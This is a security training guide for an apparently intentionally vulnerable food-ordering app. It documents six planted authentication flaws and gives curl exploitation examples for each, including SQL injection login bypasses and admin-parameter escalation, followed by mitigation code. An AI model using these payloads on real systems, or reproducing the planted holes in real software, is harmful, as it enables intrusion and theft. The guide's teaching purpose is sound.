# Authentication Bypass Vulnerabilities Guide

This guide documents the authentication bypass vulnerabilities intentionally introduced in the VulnEats food ordering system for educational purposes.

## ⚠️ WARNING
These vulnerabilities are **INTENTIONALLY INTRODUCED** for cybersecurity education. Never implement these in production systems!

## Vulnerability Summary

| Vulnerability | Severity | Location | Description |
|---------------|----------|----------|-------------|
| SQL Injection in Login | **CRITICAL** | `/api/login` | Allows bypassing authentication through SQL injection |
| Role Escalation via Parameters | **HIGH** | `@login_required_json` decorator | Grants admin access via request parameters |
| Weak Session Validation | **HIGH** | `/api/me` | Admin/user bypass via URL parameters |
| Session Fixation/Hijacking | **MEDIUM** | `/api/logout` | Session manipulation via parameters |
| Debug Endpoint Exposure | **CRITICAL** | `/api/debug/users` | Exposes all user data without authentication |
| Admin User Deletion Bypass | **HIGH** | `/api/admin/user/<id>/delete` | Unprotected admin endpoint |

## Detailed Vulnerability Analysis

### 1. SQL Injection in Login (CRITICAL)

**Location:** `backend/app.py` lines 486-518

**Vulnerability:** The login endpoint uses string concatenation instead of parameterized queries, allowing SQL injection.

**Exploitation Examples:**
```bash
# Bypass authentication completely
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "' OR 1=1--", "password": "anything"}'

# Login as specific user (admin)
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'--", "password": "anything"}'

# Union injection to create fake admin user
curl -X POST http://localhost:5001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "' UNION SELECT 1,'admin','admin'--", "password": "anything"}'
```

**Impact:** Complete authentication bypass, potential for privilege escalation.

### 2. Role Escalation via Parameters (HIGH)

**Location:** `backend/app.py` lines 452-471

**Vulnerability:** The `@login_required_json` decorator checks for `admin_mode` or `role` parameters and grants admin access.

**Exploitation Examples:**
```bash
# Grant admin access via admin_mode parameter
curl -X POST http://localhost:5001/api/dashboard \
  -H "Content-Type: application/json" \
  -d '{"admin_mode": "true"}'

# Grant admin access via role parameter
curl -X POST http://localhost:5001/api/dashboard \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

**Impact:** Any user can escalate to admin privileges by manipulating request parameters.

### 3. Weak Session Validation (HIGH)

**Location:** `backend/app.py` lines 593-636

**Vulnerability:** The `/api/me` endpoint accepts URL parameters to bypass authentication.

**Exploitation Examples:**
```bash
# Get admin access via URL parameter
curl http://localhost:5001/api/me?admin=true

# Access as specific user via user_id parameter
curl http://localhost:5001/api/me?user_id=1
```

**Impact:** Complete authentication bypass via URL manipulation.

### 4. Session Fixation/Hijacking (MEDIUM)

**Location:** `backend/app.py` lines 555-572

**Vulnerability:** The logout endpoint allows session hijacking via `session_id` parameter.

**Exploitation Examples:**
```bash
# Hijack session via session_id parameter
curl -X POST http://localhost:5001/api/logout?session_id=hijacked123
```

**Impact:** Session hijacking and privilege escalation.

### 5. Debug Endpoint Exposure (CRITICAL)

**Location:** `backend/app.py` lines 1292-1325

**Vulnerability:** Unprotected endpoint that exposes all user data including password hashes.

**Exploitation Examples:**
```bash
# Access all user data without authentication
curl http://localhost:5001/api/debug/users
```

**Impact:** Complete user database exposure, password hash disclosure.

### 6. Admin User Deletion Bypass (HIGH)

**Location:** `backend/app.py` lines 1537-1584

**Vulnerability:** Admin user deletion endpoint is not protected by authentication.

**Exploitation Examples:**
```bash
# Delete any user without authentication
curl -X POST http://localhost:5001/api/admin/user/1/delete
```

**Impact:** Unauthorized user deletion, potential DoS attack.

## Testing the Vulnerabilities

### Prerequisites
1. Start the backend server: `cd backend && python app.py`
2. Start the frontend: `cd frontend && npm run dev`
3. Have a user account created (register via the UI)

### Testing Steps

1. **Test SQL Injection:**
   - Use the login form with SQL injection payloads
   - Try: `username: ' OR 1=1--`, `password: anything`

2. **Test Role Escalation:**
   - Use browser dev tools to modify API requests
   - Add `{"admin_mode": "true"}` to POST requests

3. **Test URL Parameter Bypass:**
   - Visit: `http://localhost:3000/api/me?admin=true`
   - Check if you get admin access

4. **Test Debug Endpoint:**
   - Visit: `http://localhost:5001/api/debug/users`
   - Verify all user data is exposed

## Educational Objectives

These vulnerabilities help students learn:

1. **SQL Injection:** How improper input validation leads to authentication bypass
2. **Parameter Manipulation:** How client-side parameters can be exploited
3. **Session Management:** Importance of proper session validation
4. **Access Control:** Need for consistent authentication checks
5. **Information Disclosure:** Dangers of debug endpoints in production

## Mitigation Strategies

### 1. SQL Injection Prevention
```python
# Use parameterized queries
user = conn.execute(
    "SELECT id, username, role FROM users WHERE username = ? AND password_hash = ?",
    (username, password_hash),
).fetchone()
```

### 2. Proper Authentication
```python
def admin_required_json(fn):
    def wrapper(*args, **kwargs):
        if "user_id" not in session:
            return jsonify({"error": "auth_required"}), 401
        
        conn = get_db_connection()
        user = conn.execute('SELECT role FROM users WHERE id = ?', (session['user_id'],)).fetchone()
        conn.close()
        
        if not user or user['role'] != 'admin':
            return jsonify({"error": "forbidden"}), 403
        return fn(*args, **kwargs)
    return wrapper
```

### 3. Input Validation
```python
# Validate all input parameters
admin_bypass = request.args.get('admin')
if admin_bypass:
    return jsonify({"error": "invalid_parameter"}), 400
```

### 4. Remove Debug Endpoints
- Never expose debug endpoints in production
- Use proper logging instead of direct data exposure

## Security Best Practices

1. **Always use parameterized queries** for database operations
2. **Validate all user input** on both client and server side
3. **Implement proper session management** with secure session IDs
4. **Use role-based access control** consistently across all endpoints
5. **Never expose sensitive data** through debug endpoints
6. **Implement proper authentication checks** on all protected endpoints
7. **Use strong password hashing** (bcrypt, not MD5)
8. **Implement CSRF protection** for state-changing operations

## Conclusion

These authentication bypass vulnerabilities demonstrate common security flaws in web applications. Students can use this system to:

- Practice identifying authentication vulnerabilities
- Learn exploitation techniques in a safe environment
- Understand the importance of proper security implementation
- Develop skills in penetration testing and security assessment

Remember: These vulnerabilities are for educational purposes only. Always follow security best practices in production systems!
